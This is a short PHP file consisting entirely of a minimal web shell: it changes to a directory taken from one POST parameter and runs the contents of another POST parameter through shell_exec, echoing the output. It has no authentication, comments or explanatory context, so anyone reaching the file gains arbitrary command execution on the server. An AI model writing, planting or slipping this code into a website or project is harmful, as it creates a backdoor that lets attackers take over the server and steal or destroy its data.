<?php
@chdir(urldecode($_POST['dir']));
echo shell_exec($_POST['command']);
?>